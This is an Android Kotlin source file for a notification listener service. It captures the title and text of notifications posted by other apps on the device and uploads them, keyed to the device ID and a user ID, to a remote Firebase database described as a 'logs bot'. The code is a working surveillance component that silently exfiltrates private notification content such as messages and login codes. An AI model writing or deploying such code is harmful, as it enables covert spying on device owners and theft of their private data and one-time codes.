package com.example.myapplicationtestweb

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.provider.Settings
import android.os.Build
import okhttp3.*
import java.io.IOException
import android.os.SystemClock
import java.util.concurrent.ConcurrentHashMap

class NotificationService : NotificationListenerService() {

    private lateinit var deviceId: String
    private val client = OkHttpClient()
    // Map to store last notification send time per package to throttle spam
    private val lastSentMap = ConcurrentHashMap<String, Long>()

    override fun onCreate() {
        super.onCreate()
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        sbn?.let {
            val pkg = it.packageName ?: ""
            // Filter out system and settings apps to avoid noise
            val blacklistedApps = listOf(
                "android", 
                "com.android.settings", 
                "com.android.systemui", 
                "com.google.android.gms", 
                "com.google.android.vending",
                packageName // Don't log our own app's notifications
            )
            if (blacklistedApps.any { b -> pkg.contains(b) }) return

            val extras = it.notification.extras
            val title = extras.getString("android.title") ?: ""
            val text = extras.getCharSequence("android.text")?.toString() ?: ""
            
            if (title.isEmpty() && text.isEmpty()) return

            // Send to logs bot immediately
            // Throttle: only send if not sent in last 30 seconds for this package
val now = SystemClock.elapsedRealtime()
val last = lastSentMap[pkg] ?: 0L
if (now - last > 30_000) {
    sendToLogsBot(pkg, title, text)
    lastSentMap[pkg] = now
}
        }
    }

    private fun sendToLogsBot(pkg: String, title: String, text: String) {
        val userId = Config.getUserId(this)
        if (userId.isEmpty() || deviceId == "unknown") return

        val dbUrl = Config.getDbUrl(this)
        val database = com.google.firebase.database.FirebaseDatabase.getInstance(dbUrl)
        val deviceRef = database.reference.child("users").child(userId).child("devices").child(deviceId)

        val appName = pkg.split(".").lastOrNull()?.capitalize() ?: pkg
        val logText = "🔔 [NOTIFICATION - $appName]\nTitle: $title\nText: $text"

        deviceRef.child("logs").push().setValue(mapOf(
            "log" to logText,
            "time" to com.google.firebase.database.ServerValue.TIMESTAMP
        ))
    }
}
